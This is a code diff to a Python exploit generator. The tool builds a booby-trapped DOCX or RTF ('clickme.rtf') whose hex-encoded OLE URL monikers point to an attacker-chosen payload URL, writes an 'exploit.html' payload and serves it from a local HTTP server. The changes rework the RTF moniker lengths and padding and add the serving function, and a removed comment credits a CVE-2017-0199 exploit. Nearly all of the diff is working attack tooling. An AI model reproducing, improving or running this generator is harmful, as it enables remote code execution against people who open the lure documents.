@@ -4,6 +4,8 @@ import zipfile
 import http.server
 import socketserver
 import base64
+from time import sleep, perf_counter
+import threading as th
 from urllib.parse import urlparse
 
 # Helper function to zip whole dir
@@ -38,27 +40,54 @@ def generate_docx(payload_url):
 
     print(f"Generated '{const_docx_name}' in current directory")
 
-#solution based on https://github.com/bhdresh/CVE-2017-0199    
+    return const_docx_name
+
+    
 def generate_rtf(payload_url):
     s = payload_url
-    docuri_hex = "00".join("{:02x}".format(ord(c)) for c in s)
-    docuri_pad_len = 224 - len(docuri_hex)
-    docuri_pad = "0"*docuri_pad_len
-    uri_hex = "010000020900000001000000000000000000000000000000a4000000e0c9ea79f9bace118c8200aa004ba90b8c000000"+docuri_hex+docuri_pad+"00000000795881f43b1d7f48af2c825dc485276300000000a5ab0000ffffffff0609020000000000c00000000000004600000000ffffffff0000000000000000906660a637b5d201000000000000000000000000000000000000000000000000100203000d0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000"
+    docuri_hex = "".join("{:02x}".format(ord(c)) for c in s)
+    docuri_hex_wide = "00".join("{:02x}".format(ord(c)) for c in s)
+
+    url_moniker_length = (int(len(docuri_hex_wide)/2)+3+24) #calculate the length of the wide string, divide by 2 to account for the wide characters, add 3 null bytes and finally add 24 as per MS-CBF specifications
+    url_moniker_length_encoded = f"{url_moniker_length:x}"
+
+    composite_moniker_length = int(len(docuri_hex_wide)/2)+3+95 #calculate the length of the wide string, divide by 2 to account for the wide characters, add 3 null bytes and finally add rest of header size
+    composite_moniker_length_encoded = f"{composite_moniker_length:x}"
     const_rtf_name = "clickme.rtf"
+
+    null_padding_ole_object = "00"*(196-int(len(docuri_hex_wide)/2))
+    null_padding_link_object = "00"*(565-int(len(docuri_hex_wide)/2)-int(len(docuri_hex)/2))
 
     with open("src/rtf/clickme.rtf.tpl", "r") as f:
         tmp = f.read()
 
-    payload_rtf = tmp.replace('{payload_url}', uri_hex) # cannot use format due to {} characters in RTF
+    payload_rtf = tmp.replace('payload_url_deobf', payload_url) # cannot use format due to {} characters in RTF
+    payload_rtf = payload_rtf.replace('{payload_url_hex}', docuri_hex)
+    payload_rtf = payload_rtf.replace('{composite_moniker_length_encoded}', composite_moniker_length_encoded)
+    payload_rtf = payload_rtf.replace('{url_moniker_length_encoded}', url_moniker_length_encoded)
+    payload_rtf = payload_rtf.replace('{payload_url_wide}', docuri_hex_wide)
+    payload_rtf = payload_rtf.replace('{null_padding_ole_object}', null_padding_ole_object)
+    payload_rtf = payload_rtf.replace('{null_padding_link_object}', null_padding_link_object)
 
     with open(const_rtf_name, "w") as f:
         f.write(payload_rtf)
 
     print(f"Generated '{const_rtf_name}' in current directory")    
 
-if __name__ == "__main__":
+    return const_rtf_name
 
+def start_http(host, port):
+    class Handler(http.server.SimpleHTTPRequestHandler):
+        def __init__(self, *args, **kwargs):
+            super().__init__(*args, directory="www", **kwargs)
+
+    print(f"Serving payload on {payload_url}")
+
+    with socketserver.TCPServer((host, port), Handler) as httpd:
+        httpd.handle_request()
+
+if __name__ == "__main__":
+    
     # Parse arguments
     parser = argparse.ArgumentParser()
     required = parser.add_argument_group('Required Arguments')
@@ -117,10 +146,10 @@ if __name__ == "__main__":
 
     # Prepare the doc file
     if args.type == "docx":
-        generate_docx(payload_url)
+        payload_name = generate_docx(payload_url)
 
     if args.type == "rtf":
-        generate_rtf(payload_url)
+        payload_name = generate_rtf(payload_url)
 
     # Prepare the HTML payload
     if not os.path.exists("www"):
@@ -135,7 +164,7 @@ if __name__ == "__main__":
         f.write(payload_html)
 
     print("Generated 'exploit.html' in 'www' directory")
-
+    
     # Host the payload
     if enable_webserver is True:
         class Handler(http.server.SimpleHTTPRequestHandler):
